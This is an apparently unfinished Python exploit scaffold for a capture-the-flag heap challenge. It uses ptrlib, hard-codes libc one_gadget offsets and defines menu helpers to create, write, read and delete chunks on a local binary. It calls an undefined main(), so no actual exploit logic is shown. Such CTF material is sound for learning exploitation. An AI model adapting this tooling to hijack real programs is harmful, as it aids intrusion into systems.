#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./chall_patched")
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")

one_gadgets = [0xEBCF1, 0xEBCF5, 0xEBCF8, 0xEBD52, 0xEBDA8, 0xEBDAF, 0xEBDB3]
ptr.logger.setLevel("DEBUG")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def create(io, index, size):
    size_ = 0
    if size > 0x600:
        ptr.logger.error("size too big")
        exit(1)
    if size < 0x500:
        ptr.logger.warn("size has been fixed to 0x500")
        size_ = 0x500
    else:
        size_ = size

    ptr.logger.debug("> 1")
    io.sendlineafter("> ", "1")
    ptr.logger.debug(f"index: {index}")
    io.sendlineafter("index: ", str(index).encode())
    ptr.logger.debug(f"size: {size_}")
    io.sendlineafter("size: ", str(size_).encode())
    ptr.logger.debug(f"finished!")


def write(io, index, data):
    ptr.logger.info(f"writing {index} with data {data}")
    ptr.logger.debug("> 2")
    io.sendlineafter("> ", "2")
    ptr.logger.debug(f"index: {index}")
    io.sendlineafter("index: ", str(index))
    ptr.logger.debug(f"data: {data}")
    io.sendlineafter("data: ", data)
    ptr.logger.debug("finished!")


def read(io, index, size):
    ptr.logger.info(f"reading {index} with size {size}")
    ptr.logger.debug("> 3")
    io.sendlineafter("> ", "3")
    ptr.logger.debug(f"index: {index}")
    io.sendlineafter("index: ", str(index))
    ptr.logger.debug('receiving "papyrus: "')
    io.recvuntil("papyrus: ")
    ptr.logger.debug(f"receiving data (size: {size})")
    data = io.recv(size)
    ptr.logger.debug("finished")
    return data


def delete(io, index):
    ptr.logger.info(f"deleting {index}")
    ptr.logger.debug("> 4")
    io.sendlineafter("> ", "4")
    ptr.logger.debug(f"index: {index}")
    io.sendlineafter("index: ", str(index))
    ptr.logger.debug("finished!")




if __name__ == "__main__":
    main()
